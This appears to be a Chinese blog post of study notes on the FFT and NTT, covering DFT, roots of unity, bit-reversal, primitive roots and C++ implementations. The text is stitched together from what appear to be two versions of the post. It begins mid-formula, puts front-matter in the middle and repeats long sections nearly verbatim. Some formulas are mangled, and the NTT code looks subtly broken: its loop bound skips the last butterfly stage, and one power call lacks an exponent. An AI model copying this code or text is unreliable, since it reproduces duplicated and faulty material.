\u0026amp;= f_0 + f_2x + f_4x^2 + f_6x^3 \\ f^{[1]}(x) \u0026amp;= f_1 + f_3x + f_5x^2 + f_7x^3 \\end{aligned} $$\n则原来的函数可以表示为\n$$ f(x) = f^{[0]}(x^2) + xf^{[1]}(x^2) $$\n一般的，对于度小于 $n$ 的多项式 $f(x)$，在单位根 $x = \\zeta_n^k$ 处的点值是\n$$ \\begin{aligned} f(\\zeta_n^k) \u0026amp;= f^{[0]}(\\zeta_n^k \\cdot \\zeta_n^k) + \\zeta_n^kf^{[1]}(\\zeta_n^k \\cdot \\zeta_n^k) \\\\ \u0026amp;= f^{[0]}(\\zeta_n^{2k}) + \\zeta_n^kf^{[1]}(\\zeta_n^{2k}) \\\\ \u0026amp;= f^{[0]}(\\zeta_{n/2}^{k}) + \\zeta_n^kf^{[1]}(\\zeta_{n/2}^{k}) \\end{aligned} $$\n同理可得\n$$ \\begin{aligned} f(\\zeta_n^{k+n/2}) \u0026amp;= f^{[0]}(\\zeta_n^{2k+n}) + \\zeta_n^{k+n/2}f^{[1]}(\\zeta_n^{2k+n}) \\ \u0026amp;= f^{[0]}(\\zeta_{n/2}^{k}) - \\zeta_n^{k}f^{[1]}(\\zeta_{n/2}^{k}) \\end{aligned} $$\n在 DFT 中使用有\n$$ \\begin{aligned} \\mathcal{F}n(f)[j] \u0026amp;= \\mathcal{F}{n/2}(f^{[0]})[j] + \\zeta_n^j \\mathcal{F}{n/2}(f^{[1]})[j] \\ \\mathcal{F}n(f)[j + n/2] \u0026amp;= \\mathcal{F}{n/2}(f^{[0]})[j] - \\zeta_n^j\\mathcal{F}{n/2}(f^{[1]})[j] \\end{aligned} \\tag{2} $$\n因此我们需要把多项式的系数个数向上补到 $2^n$，方便分治。\n至此，我们可以写出递归版的 FFT。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void fft(int n, img *f, int op) { static img tmp[1 \u0026lt;\u0026lt; 18]; if (n == 1) return; for (int i = 0; i \u0026lt; n; i++) tmp[i] = f[i]; for (int i = 0; i \u0026lt; n; i++) { // 偶数放左边，奇数放右边 if (i \u0026amp; 1) f[n / 2 + i / 2] = tmp[i]; else f[i / 2] = tmp[i]; } img *g = f, *h = f + n / 2; fft(n / 2, g, op), fft(n / 2, h, op); img w0 = {cos(2 * PI / n), sin(2 * PI * op / n)}, w = {1, 0}; for (int k = 0; k \u0026lt; n / 2; k++) { tmp[k] = g[k] + w * h[k]; tmp[k + n / 2] = g[k] - w * h[k]; w = w * w0; } for (int i = 0; i \u0026lt; n; i++) f[i] = tmp[i]; } 蝴蝶变换 递归分治总是不尽人意的，我们在前几行只是做了递归分组的事情，可以考虑一步到位。\n还是以 $7$ 次多项式为例\n初始 ${x^0,x^1,x^2,x^3,x^4,x^5,x^6,x^7}$ 一次 ${x^0,x^2,x^4,x^6},{x^1,x^3,x^5,x^7}$ 两次 ${x^0,x^4},{x^2,x^6},{x^1,x^5},{x^3,x^7}$ 结束 ${x^0},{x^4},{x^2},{x^6},{x^1},{x^5},{x^3},{x^7}$ 写出二进制的形式，可以发现：结束和开始的二进制恰好是相反的。\n初始 0 1 2 3 4 5 6 7 初始(2) 000 001 010 011 100 101 110 111 结束(2) 000 100 010 110 001 101 011 111 结束 0 4 2 6 1 5 3 7 这个变换称为蝴蝶变换，也称位逆序置换（bit-reversal permutation）。\n我们可以 $O(n)$ 的预处理出变换数组。设 R(x) 是 $x$ 的变换结果，则 R(x \u0026gt;\u0026gt; 1) 此时是已知的。即是把 R(x \u0026gt;\u0026gt; 1) 右移一位再补上最高位即可。代码如下\n1 2 3 4 5 6 7 8 9 10 11 void pre_rev(int lim) { int k = std::__lg(lim); rev.resize(lim); for (int i = 0; i \u0026lt; lim; ++i) { rev[i] = rev[i \u0026gt;\u0026gt; 1] \u0026gt;\u0026gt; 1; if (i \u0026amp; 1) rev[i] |= lim \u0026gt;\u0026gt; 1; // 或者合并写为 // rev[i] = (rev[i \u0026gt;\u0026gt; 1] \u0026gt;\u0026gt; 1) | ((i \u0026amp; 1) \u0026lt;\u0026lt; (k - 1)); } } 现在我们可以写出非递归版的 FFT。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void fft(img *f, int n, int op) { // DIT for (int i = 0; i \u0026lt; n; ++i) if (i \u0026lt; rev[i]) swap(f[i], f[rev[i]]); for (int l = 1; l \u0026lt;= n / 2; l \u0026lt;\u0026lt;= 1) { img w0 = {cos(PI / l), sin(PI * op / l)}; for (int i = 0; i \u0026lt; n; i += l * 2) { img w = {1, 0}; for (int j = 0; j \u0026lt; l; j++) { img x = f[i + j], y = w * f[i + j + l]; f[i + j] = x + y, f[i + j + l] = x - y; w = w * w0; } } } if (op == -1) for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] / n; } NTT 前置知识：数论基础（整除，同余）。\n用 double 去实现整数的乘法是很不优美的，精度、速度都很成问题。实际上，我们可以仅在整数下进行运算。\n原根 我们本质上用到的单位原根 $\\zeta_n$ 的两个性质是：\n$\\zeta_{n}^{n} = 1$。 $\\zeta_{2n}^{n} = -1$。 可以联想到模 $p$ 剩余类域 $\\mathbb{Z}_p$：其中的元素是 ${0,1,\\cdots,p-1}$，其上的运算都是模 $p$ 的。由于 Fermat 小定理\n$$ a^{\\varphi(p)} = a^{p-1} \\equiv 1 $$\n即从另一个角度说，$p-1$ 个正整数都是同余方程 $x^{p-1} \\equiv 1$ 的解。\n它和单位根有很相似的形式，直觉上 $\\mathbb{Z}_p$ 也存在类似单位原根的特殊数字。下面我们在 $\\mathbb{Z}_p$ 上讨论，尝试证明这个数字存在。\n定义正整数 $a \\in \\mathbb{Z}_p$ 的阶 $\\delta_p(a)$ 为最小的 $r$ 使得 $a^r \\equiv 1$。由 Fermat 小定理 $a^{\\varphi(p)} \\equiv 1$，因此 $a$ 的阶一定存在且有 $\\delta_p(a) \\mid \\varphi(p)$。可以证明\n$$ a,a^2,\\cdots a^{\\delta_p(a)} \\tag{3} $$\n在模 $p$ 下余数互不相同。由 Lagrange 定理，$x^{\\delta_p(a)} \\equiv 1$ 的解至多有 $\\delta_p(a)$ 个，恰是 $(3)$ 中所展示的。\n通过整除的性质，可以想到只有 $i \\bot \\delta_p(a)$ 才有 $\\delta_p(a^i) = \\delta_p(a)$，即 $a$ 总是附带着\n$$ \\sum_{i=1}^{\\delta_p(a)} [\\gcd(i, \\delta_p(a)) = 1] = \\varphi(\\delta_p(a)) $$\n个阶相同的东西。因此阶为 $\\delta_p(a)$ 的数恰有 $\\varphi(\\delta_p(a))$ 个。\n因为每个正整数都有唯一确定的阶，不妨假设对于所有 $d \\mid \\varphi(p)$，阶 $d$ 都存在 $\\varphi(d)$ 个对应的整数，统计整数个数\n$$ \\sum_{d \\mid \\varphi(p)} \\varphi(d) = \\varphi(p) = p - 1 $$\n恰为 $\\mathbb{Z}_p$ 全部正整数的个数，因此假设成立，也就存在 $a$ 使得 $\\delta_p(a) = p-1$。\n我们称这个 $a$ 是模 $p$ 下的一个原根，常用字母 $g$ 表示。\n快速数论变换 尽可能提取 $p - 1$ 的因子 $2$ 有\n$$ p = N q + 1, N = 2^m $$\n设 $\\mathbb{Z}_p$ 的一个原根 $g$，将 $g_N \\equiv g^q$ 看作 $\\zeta_n$ 的等价。利用二次剩余的知识不难得到 $g_N^N \\equiv 1$ 和 $g_N^{N/2} \\equiv -1$。\n常见的有\n$$ \\begin{aligned} p = 1004535809 = 479 \\times 2^{21} + 1\u0026amp;, g = 3 \\ p = 998244353 = 7 \\times 17 \\times 2^{23} + 1\u0026amp;, g = 3 \\end{aligned} $$\n类似的，我们可以写出程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void ntt(ll *f, int n, int type) { for (int i = 0; i \u0026lt; n; ++i) if (i \u0026lt; rev[i]) swap(f[i], f[rev[i]]); for (int h = 2; h \u0026lt; n; h \u0026lt;\u0026lt;= 1) { ll tg = type == 1 ? 3 : g_inv; ll gn = qpow(tg, (P - 1) / h); for (int j = 0; j \u0026lt; n; j += h) { ll g = 1; for (int k = j; k \u0026lt; j + h / 2; k++) { ll f1 = f[k], f2 = g * f[k + h / 2] % P; f[k] = (f1 + f2) % P; f[k + h / 2] = (f1 - f2 + P) % P; g = g * gn % P; } } } ll iv_n = qpow(n); if (type == -1) for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] * iv_n % P; } 至此，你已经学会 FFT 了。下面我们将更深入的从数学角度研究 FFT，补足理论基础。\n线性变换 DFT 是一个线性变换。换句话说，它可以被写成矩阵乘法的形式\n$$ \\begin{bmatrix} f(\\zeta_n^0) \\ f(\\zeta_n^1) \\ f(\\zeta_n^2) \\ \\vdots \\ f(\\zeta_n^{n-1}) \\end{bmatrix} = \\begin{bmatrix} 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\ 1 \u0026amp; \\zeta_n^1 \u0026amp; \\zeta_n^2 \u0026amp; \\cdots \u0026amp; \\zeta_n^{n-1} \\ 1 \u0026amp; \\zeta_n^2 \u0026amp; \\zeta_n^4 \u0026amp; \\cdots \u0026amp; \\zeta_n^{2(n-1)} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\ 1 \u0026amp; \\zeta_n^{n-1} \u0026amp; \\zeta_n^{2(n-1)} \u0026amp; \\cdots \u0026amp; \\zeta_n^{(n-1)^2} \\end{bmatrix} \\begin{bmatrix} f_0 \\ f_1 \\ f_2 \\ \\vdots \\ f_{n-1} \\end{bmatrix} $$\n我们把中间的那个 $n$ 阶的 Vandermonde 方阵记为 $V(\\zeta_n) = (\\zeta_n^{ij})$。\n直接计算 $V(\\zeta_n)$ 的逆很不好算，但是验证下式是对角矩阵还是容易的\n$$ V(\\zeta_n) V(\\zeta_n^{-1}) = (n[i = j]) = n I_n $$\n即 IDFT 所对应的矩阵为 $V^{-1}(\\zeta_n) = \\frac{1}{n} V(\\zeta_n^{-1})$，我们便证明了 $(1)$ 式。\n预处理单位根 每次计算都重新计算一遍单位根太浪费了，我们可以预处理它，从而在计算中调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 vector\u0026lt;img\u0026gt; ROOT; void init(int n) { static int lim = (ROOT = {{1, 0}}, 1); if (lim \u0026gt;= n) return; ROOT.resize(n); for (int l = lim; l \u0026lt; n; l *= 2) { img w = {cos(PI / l / 2), sin(PI / l / 2)}; ROOT[l] = w; for (int i = 1; i \u0026lt; l; ++i) ROOT[i + l] = ROOT[i] * w; } lim = n; } author: \u0026ldquo;rogeryoungh\u0026rdquo; title: \u0026ldquo;FFT \u0026amp; NTT 学习笔记\u0026rdquo; date: \u0026ldquo;2021-07-22\u0026rdquo; description: \u0026ldquo;FFT 怎么这么难啊。\u0026rdquo; tags: [多项式] 以下是我对 FFT 的感性理解，可能并不严谨，如有错误欢迎指正。\nFFT 以下讲述的算法是 Cooley–Tukey FFT，它在算法竞赛中使用的更为广泛。\n前置知识：复数，需要理解 Euler 公式。\n多项式乘法 对于 $n$ 次多项式\n$$ \\begin{aligned} f(x) = \\sum_{i=0}^n f_ix^i \u0026amp;= f_0 + f_1 x + f_2x^2 + \\cdots + g_nx^n \\ g(x) = \\sum_{i=0}^n g_ix^i \u0026amp;= g_0 + g_1 x + g_2x^2 + \\cdots + g_nx^n \\end{aligned} $$\n它们的卷积是 $F(x) = f(x) \\ast g(x) = (f \\ast g)(x) = \\sum\\limits_{k=0}^{2n} c_kx^k$，其中\n$$ c_k = \\sum_{i+j=k}f_ig_j $$\n因此朴素的计算多项式的卷积需要 $n^2$ 次系数乘法，我们需要优化。\n点值表示法 $n$ 次多项式 $f(x)$ 可以由 $n+1$ 个系数决定，也可以由 $n+1$ 个座标（点值）决定。即 $n$ 次多项式可以看作 $n+1$ 维的向量。\n考虑选取 $2n+1$ 个座标来确定 $f(x)$ 和 $g(x)$。则 $F(x)$ 可以简单的通过做 $2n+1$ 次乘法得到\n$$ (x_k,F(x_k)) = \\left(x_k, f(x_k)g(x_k)\\right) $$\n现在我们有了新的思路：先从系数表示法转换为点值表示法，做完乘法后再变回去。\nDFT 怎么把多项式转换成点值呢？我们有离散 Fourier 变换。\n称方程 $x^n = 1$ 的 $n$ 个解为单位根 $\\zeta_n$。对于给定的多项式 $f(x) = \\sum\\limits_{k=0}^{n-1} f_kx^k$ 和一个单位根 $\\zeta_n$，称向量\n$$ \\operatorname{DFT}_{\\zeta_n}(f) =( f(1), f(\\zeta_n^1), \\cdots, f(\\zeta_n^{n-1}) ) $$\n为 $f$ 的离散 Fourier 变换（Discrete Fourier Transform）。\nDFT 存在逆变换（IDFT），即从点值重新变回系数，仍是从向量到向量的变换。\nIDFT 具有一个关键性质\n$$ (\\operatorname{DFT}{\\zeta})^{-1} = \\frac{1}{n} (\\operatorname{DFT}{{\\zeta}^{-1}}) \\tag{1} $$\n我们将在后文证明它。现在我们可以统一的处理 DFT 和 IDFT。\n为了方便描述，接下来我们将把 $\\operatorname{DFT}_{\\zeta_n}$ 简单的记作 $\\mathcal{F}_n$。\n单位原根 至此，我们计算 DFT 的复杂度仍然是 $O(n^2)$，FFT 所迈出的关键一步是选取特殊的点加速计算。\n单位根中特殊的一个记作 $\\zeta_n = e^{\\frac{2 \\pi i}{n}}$，它叫做单位原根。依 Euler 公式，有\n$$ \\zeta_n = e^{\\tfrac{2 \\pi i}{n}} = \\cos \\left(\\frac{2\\pi}{n}\\right) + i \\sin \\left(\\frac{2\\pi}{n}\\right) $$\n即 $\\zeta_n$ 是单位圆上的一个点，全部的 $n$ 个单位根\n$$ x_k = \\zeta_n^k = e^{k\\tfrac{2 \\pi i}{n}} = \\cos \\left(\\frac{2\\pi k}{n}\\right) + i \\sin \\left(\\frac{2\\pi k}{n}\\right) $$\n恰对应到单位圆的 $n$ 等分点。因此根据 Euler 公式，单位根之间的乘法就是在单位圆上转圈圈。\n不难通过 Euler 公式验证单位原根 $\\zeta_n$ 的几条性质：\n$\\zeta_{2n}^{2k} = \\zeta_n^k$。 $\\zeta_{2n}^{n+k} = -\\zeta_{2n}^k$。 分治 利用单位原根的特殊性，我们可以分治计算 DFT。比如对于 $7$ 次多项式\n$$ \\begin{aligned} f(x) \u0026amp;= f_0 + f_1x + f_2x^2 + f_3 x^3 + f_4 x^4 + f_5 x^5 + f_6 x^6 + f_7 x^7 \\ \u0026amp;= (f_0 + f_2x^2 + f_4x^4 + f_6x^6) + x(f_1 + f_3x^2 + f_5x^4 + f_7x^6) \\end{aligned} $$\n奇偶分类\n$$ \\begin{aligned} f^{[0]}(x) \u0026amp;= f_0 + f_2x + f_4x^2 + f_6x^3 \\ f^{[1]}(x) \u0026amp;= f_1 + f_3x + f_5x^2 + f_7x^3 \\end{aligned} $$\n则原来的函数可以表示为\n$$ f(x) = f^{[0]}(x^2) + xf^{[1]}(x^2) $$\n一般的，对于度小于 $n$ 的多项式 $f(x)$，在单位根 $x = \\zeta_n^k$ 处的点值是\n$$ \\begin{aligned} f(\\zeta_n^k) \u0026amp;= f^{[0]}(\\zeta_n^k \\cdot \\zeta_n^k) + \\zeta_n^kf^{[1]}(\\zeta_n^k \\cdot \\zeta_n^k) \\ \u0026amp;= f^{[0]}(\\zeta_n^{2k}) + \\zeta_n^kf^{[1]}(\\zeta_n^{2k}) \\ \u0026amp;= f^{[0]}(\\zeta_{n/2}^{k}) + \\zeta_n^kf^{[1]}(\\zeta_{n/2}^{k}) \\end{aligned} $$\n同理可得\n$$ \\begin{aligned} f(\\zeta_n^{k+n/2}) \u0026amp;= f^{[0]}(\\zeta_n^{2k+n}) + \\zeta_n^{k+n/2}f^{[1]}(\\zeta_n^{2k+n}) \\ \u0026amp;= f^{[0]}(\\zeta_{n/2}^{k}) - \\zeta_n^{k}f^{[1]}(\\zeta_{n/2}^{k}) \\end{aligned} $$\n在 DFT 中使用有\n$$ \\begin{aligned} \\mathcal{F}n(f)[j] \u0026amp;= \\mathcal{F}{n/2}(f^{[0]})[j] + \\zeta_n^j \\mathcal{F}{n/2}(f^{[1]})[j] \\ \\mathcal{F}n(f)[j + n/2] \u0026amp;= \\mathcal{F}{n/2}(f^{[0]})[j] - \\zeta_n^j\\mathcal{F}{n/2}(f^{[1]})[j] \\end{aligned} \\tag{2} $$\n因此我们需要把多项式的系数个数向上补到 $2^n$，方便分治。\n至此，我们可以写出递归版的 FFT。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 void fft(int n, img *f, int op) { static img tmp[1 \u0026lt;\u0026lt; 18]; if (n == 1) return; for (int i = 0; i \u0026lt; n; i++) tmp[i] = f[i]; for (int i = 0; i \u0026lt; n; i++) { // 偶数放左边，奇数放右边 if (i \u0026amp; 1) f[n / 2 + i / 2] = tmp[i]; else f[i / 2] = tmp[i]; } img *g = f, *h = f + n / 2; fft(n / 2, g, op), fft(n / 2, h, op); img w0 = {cos(2 * PI / n), sin(2 * PI * op / n)}, w = {1, 0}; for (int k = 0; k \u0026lt; n / 2; k++) { tmp[k] = g[k] + w * h[k]; tmp[k + n / 2] = g[k] - w * h[k]; w = w * w0; } for (int i = 0; i \u0026lt; n; i++) f[i] = tmp[i]; } 蝴蝶变换 递归分治总是不尽人意的，我们在前几行只是做了递归分组的事情，可以考虑一步到位。\n还是以 $7$ 次多项式为例\n初始 ${x^0,x^1,x^2,x^3,x^4,x^5,x^6,x^7}$ 一次 ${x^0,x^2,x^4,x^6},{x^1,x^3,x^5,x^7}$ 两次 ${x^0,x^4},{x^2,x^6},{x^1,x^5},{x^3,x^7}$ 结束 ${x^0},{x^4},{x^2},{x^6},{x^1},{x^5},{x^3},{x^7}$ 写出二进制的形式，可以发现：结束和开始的二进制恰好是相反的。\n初始 0 1 2 3 4 5 6 7 初始(2) 000 001 010 011 100 101 110 111 结束(2) 000 100 010 110 001 101 011 111 结束 0 4 2 6 1 5 3 7 这个变换称为蝴蝶变换，也称位逆序置换（bit-reversal permutation）。\n我们可以 $O(n)$ 的预处理出变换数组。设 R(x) 是 $x$ 的变换结果，则 R(x \u0026gt;\u0026gt; 1) 此时是已知的。即是把 R(x \u0026gt;\u0026gt; 1) 右移一位再补上最高位即可。代码如下\n1 2 3 4 5 6 7 8 9 10 11 void pre_rev(int lim) { int k = std::__lg(lim); rev.resize(lim); for (int i = 0; i \u0026lt; lim; ++i) { rev[i] = rev[i \u0026gt;\u0026gt; 1] \u0026gt;\u0026gt; 1; if (i \u0026amp; 1) rev[i] |= lim \u0026gt;\u0026gt; 1; // 或者合并写为 // rev[i] = (rev[i \u0026gt;\u0026gt; 1] \u0026gt;\u0026gt; 1) | ((i \u0026amp; 1) \u0026lt;\u0026lt; (k - 1)); } } 现在我们可以写出非递归版的 FFT。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void fft(img *f, int n, int op) { // DIT for (int i = 0; i \u0026lt; n; ++i) if (i \u0026lt; rev[i]) swap(f[i], f[rev[i]]); for (int l = 1; l \u0026lt;= n / 2; l \u0026lt;\u0026lt;= 1) { img w0 = {cos(PI / l), sin(PI * op / l)}; for (int i = 0; i \u0026lt; n; i += l * 2) { img w = {1, 0}; for (int j = 0; j \u0026lt; l; j++) { img x = f[i + j], y = w * f[i + j + l]; f[i + j] = x + y, f[i + j + l] = x - y; w = w * w0; } } } if (op == -1) for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] / n; } NTT 前置知识：数论基础（整除，同余）。\n用 double 去实现整数的乘法是很不优美的，精度、速度都很成问题。实际上，我们可以仅在整数下进行运算。\n原根 我们本质上用到的单位原根 $\\zeta_n$ 的两个性质是：\n$\\zeta_{n}^{n} = 1$。 $\\zeta_{2n}^{n} = -1$。 可以联想到模 $p$ 剩余类域 $\\mathbb{Z}_p$：其中的元素是 ${0,1,\\cdots,p-1}$，其上的运算都是模 $p$ 的。由于 Fermat 小定理\n$$ a^{\\varphi(p)} = a^{p-1} \\equiv 1 $$\n即从另一个角度说，$p-1$ 个正整数都是同余方程 $x^{p-1} \\equiv 1$ 的解。\n它和单位根有很相似的形式，直觉上 $\\mathbb{Z}_p$ 也存在类似单位原根的特殊数字。下面我们在 $\\mathbb{Z}_p$ 上讨论，尝试证明这个数字存在。\n定义正整数 $a \\in \\mathbb{Z}_p$ 的阶 $\\delta_p(a)$ 为最小的 $r$ 使得 $a^r \\equiv 1$。由 Fermat 小定理 $a^{\\varphi(p)} \\equiv 1$，因此 $a$ 的阶一定存在且有 $\\delta_p(a) \\mid \\varphi(p)$。可以证明\n$$ a,a^2,\\cdots a^{\\delta_p(a)} \\tag{3} $$\n在模 $p$ 下余数互不相同。由 Lagrange 定理，$x^{\\delta_p(a)} \\equiv 1$ 的解至多有 $\\delta_p(a)$ 个，恰是 $(3)$ 中所展示的。\n通过整除的性质，可以想到只有 $i \\bot \\delta_p(a)$ 才有 $\\delta_p(a^i) = \\delta_p(a)$，即 $a$ 总是附带着\n$$ \\sum_{i=1}^{\\delta_p(a)} [\\gcd(i, \\delta_p(a)) = 1] = \\varphi(\\delta_p(a)) $$\n个阶相同的东西。因此阶为 $\\delta_p(a)$ 的数恰有 $\\varphi(\\delta_p(a))$ 个。\n因为每个正整数都有唯一确定的阶，不妨假设对于所有 $d \\mid \\varphi(p)$，阶 $d$ 都存在 $\\varphi(d)$ 个对应的整数，统计整数个数\n$$ \\sum_{d \\mid \\varphi(p)} \\varphi(d) = \\varphi(p) = p - 1 $$\n恰为 $\\mathbb{Z}_p$ 全部正整数的个数，因此假设成立，也就存在 $a$ 使得 $\\delta_p(a) = p-1$。\n我们称这个 $a$ 是模 $p$ 下的一个原根，常用字母 $g$ 表示。\n快速数论变换 尽可能提取 $p - 1$ 的因子 $2$ 有\n$$ p = N q + 1, N = 2^m $$\n设 $\\mathbb{Z}_p$ 的一个原根 $g$，将 $g_N \\equiv g^q$ 看作 $\\zeta_n$ 的等价。利用二次剩余的知识不难得到 $g_N^N \\equiv 1$ 和 $g_N^{N/2} \\equiv -1$。\n常见的有\n$$ \\begin{aligned} p = 1004535809 = 479 \\times 2^{21} + 1\u0026amp;, g = 3 \\ p = 998244353 = 7 \\times 17 \\times 2^{23} + 1\u0026amp;, g = 3 \\end{aligned} $$\n类似的，我们可以写出程序\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 void ntt(ll *f, int n, int type) { for (int i = 0; i \u0026lt; n; ++i) if (i \u0026lt; rev[i]) swap(f[i], f[rev[i]]); for (int h = 2; h \u0026lt; n; h \u0026lt;\u0026lt;= 1) { ll tg = type == 1 ? 3 : g_inv; ll gn = qpow(tg, (P - 1) / h); for (int j = 0; j \u0026lt; n; j += h) { ll g = 1; for (int k = j; k \u0026lt; j + h / 2; k++) { ll f1 = f[k], f2 = g * f[k + h / 2] % P; f[k] = (f1 + f2) % P; f[k + h / 2] = (f1 - f2 + P) % P; g = g * gn % P; } } } ll iv_n = qpow(n); if (type == -1) for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] * iv_n % P; } 至此，你已经学会 FFT 了。下面我们将更深入的从数学角度研究 FFT，补足理论基础。\n线性变换 DFT 是一个线性变换。换句话说，它可以被写成矩阵乘法的形式\n$$ \\begin{bmatrix} f(\\zeta_n^0) \\ f(\\zeta_n^1) \\ f(\\zeta_n^2) \\ \\vdots \\ f(\\zeta_n^{n-1}) \\end{bmatrix} = \\begin{bmatrix} 1 \u0026amp; 1 \u0026amp; 1 \u0026amp; \\cdots \u0026amp; 1 \\ 1 \u0026amp; \\zeta_n^1 \u0026amp; \\zeta_n^2 \u0026amp; \\cdots \u0026amp; \\zeta_n^{n-1} \\ 1 \u0026amp; \\zeta_n^2 \u0026amp; \\zeta_n^4 \u0026amp; \\cdots \u0026amp; \\zeta_n^{2(n-1)} \\ \\vdots \u0026amp; \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\ 1 \u0026amp; \\zeta_n^{n-1} \u0026amp; \\zeta_n^{2(n-1)} \u0026amp; \\cdots \u0026amp; \\zeta_n^{(n-1)^2} \\end{bmatrix} \\begin{bmatrix} f_0 \\ f_1 \\ f_2 \\ \\vdots \\ f_{n-1} \\end{bmatrix} $$\n我们把中间的那个 $n$ 阶的 Vandermonde 方阵记为 $V(\\zeta_n) = (\\zeta_n^{ij})$。\n直接计算 $V(\\zeta_n)$ 的逆很不好算，但是验证下式是对角矩阵还是容易的\n$$ V(\\zeta_n) V(\\zeta_n^{-1}) = (n[i = j]) = n I_n $$\n即 IDFT 所对应的矩阵为 $V^{-1}(\\zeta_n) = \\frac{1}{n} V(\\zeta_n^{-1})$，我们便证明了 $(1)$ 式。\n干掉 REV 其实上文所实现的 FFT 和 IFFT 并不对偶，只是卷积定理使得 IFFT 恰是 FFT 的逆运算。具体的说，我们实现了两个 DIT，因此需要在计算之前进行蝴蝶变换。\n我们运算的核心内容在于 $(2)$ 式，它可以被写做矩阵形式。\n$$ \\begin{bmatrix} O_1 \\ O_2 \\end{bmatrix} = \\begin{bmatrix} 1 \u0026amp; \\zeta_n^{-j} \\ 1 \u0026amp; -\\zeta_n^{-j} \\end{bmatrix} \\begin{bmatrix} I_1 \\ I_2 \\end{bmatrix} $$\n对矩阵求逆\n$$ \\begin{bmatrix} I_1 \\ I_2 \\end{bmatrix} = \\frac{1}{2} \\begin{bmatrix} 1 \u0026amp; 1 \\ \\zeta_n^{j} \u0026amp; -\\zeta_n^{j} \\end{bmatrix} \\begin{bmatrix} O_1 \\ O_2 \\end{bmatrix} \\tag{4} $$\n我们便得到了 DIF。类似的，我们可以实现两个 DIF 作为 FFT，此时蝴蝶变换在计算之后。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void fft(img *f, int n, int op) { // DIF for (int l = n / 2; l \u0026gt;= 1; l \u0026gt;\u0026gt;= 1) { img w0 = {cos(PI / l), sin(PI * op / l)}; for (int i = 0; i \u0026lt; n; i += l * 2) { img w = {1, 0}; for (int j = 0; j \u0026lt; l; j++) { img x = f[i + j], y = f[i + j + l]; f[i + j] = x + y, f[i + j + l] = w * (x - y); w = w * w0; } } } for (int i = 0; i \u0026lt; n; ++i) if (i \u0026lt; rev[i]) swap(f[i], f[rev[i]]); if (op == -1) for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] / n; } 容易发现，若我们以 DIF 作为 FFT，DIT 作为 IFFT，是不需要蝴蝶变换的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void fft(img *f, int n) { for (int l = n / 2; l \u0026gt;= 1; l \u0026gt;\u0026gt;= 1) { img w0 = {cos(PI / l), sin(PI / l)}; for (int i = 0; i \u0026lt; n; i += l * 2) { img w = {1, 0}; for (int j = 0; j \u0026lt; l; j++) { img x = f[i + j], y = f[i + j + l]; f[i + j] = x + y, f[i + j + l] = w * (x - y); w = w * w0; } } } } void ifft(img *f, int n) { for (int l = 1; l \u0026lt;= n / 2; l \u0026lt;\u0026lt;= 1) { img w0 = img{cos(PI / l), sin(PI / l)}.conj(); for (int i = 0; i \u0026lt; n; i += l * 2) { img w = {1, 0}; for (int j = 0; j \u0026lt; l; j++) { img x = f[i + j], y = w * f[i + j + l]; f[i + j] = x + y, f[i + j + l] = x - y; w = w * w0; } } } for (int i = 0; i \u0026lt; n; i++) f[i] = f[i] / n; } 以上，便是 Twisted FFT。\n另一种理解 注意到\n$$ f(x_0) = f \\bmod (x - x_0) $$\n我们可以从这方面着手，从取模角度重新审视上述算法。假设 $f$ 可以被分解为\n$$ f = (x^n - r)(x^n + r)f_{0} + (x^n - r)f_{1} + (x^n + r)f_{2} + f_3 $$\n令\n$$ \\begin{aligned} O_1 \u0026amp;= f \\bmod (x^n + r) = -2r f_1 + f_3\\ O_2 \u0026amp;= f \\bmod (x^n - r) = 2r f_2 + f_3 \\end{aligned} $$\n故\n$$ f \\bmod (x^{2n} - r^2) = \\frac{O_2-O_1}{2r}x^n + \\frac{O_2 + O_1}{2} = I_1 x^n + I_2 $$\n注意到代码中我们并没有直接求 $O_1$，而是对第 $j$ 位乘上了 $\\zeta_{2n}^j$，即求的是 $f(\\zeta_{2n}x)$。\n可以发现\n$$ f(\\zeta_{2n}x) \\bmod (x^n-1) = f(\\zeta_{2n}x) \\bmod ((\\zeta_{2n} x)^n - 1) = f(x) \\bmod (x^n + 1) $$\n这个图并不好理解，下面那张 Original FFT 更容易理解，但是现在广为流传的算法是 Twisted FFT。\n通过图可以看出，FFT 的过程即是先把多项式从根推到叶子，即求得所有单位根处的值，做完操作后，再从叶子推回根。\nOriginal FFT 当然，我们可以直接分治，便是 Original FFT。\n由于篇幅有限，本文不展开。\n预处理单位根 每次计算都重新计算一遍单位根太浪费了，我们可以预处理它，从而在计算中调用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 vector\u0026lt;img\u0026gt; ROOT; void init(int n) { static int lim = (ROOT = {{1, 0}}, 1); if (lim \u0026gt;= n) return; ROOT.resize(n); for (int l = lim; l \u0026lt; n; l *= 2) { img w = {cos(PI / l / 2), sin(PI / l / 2)}; ROOT[l] = w; for (int i = 1; i \u0026lt; l; ++i) ROOT[i + l] = ROOT[i] * w; } lim = n; } 其他应用 FFT 实际上是一个工具，用于快速计算卷积，这篇文章我想更聚焦于理解 FFT 的计算过程。\nFFT 还有很多应用，比如快速加法，带通配文本匹配等，后面等再刷些题了可能会开一篇讲一讲这个，现在我积累的还不够。\nRefence OI-Wiki 快速傅里叶变换 FFT 入门笔记 - hly1024 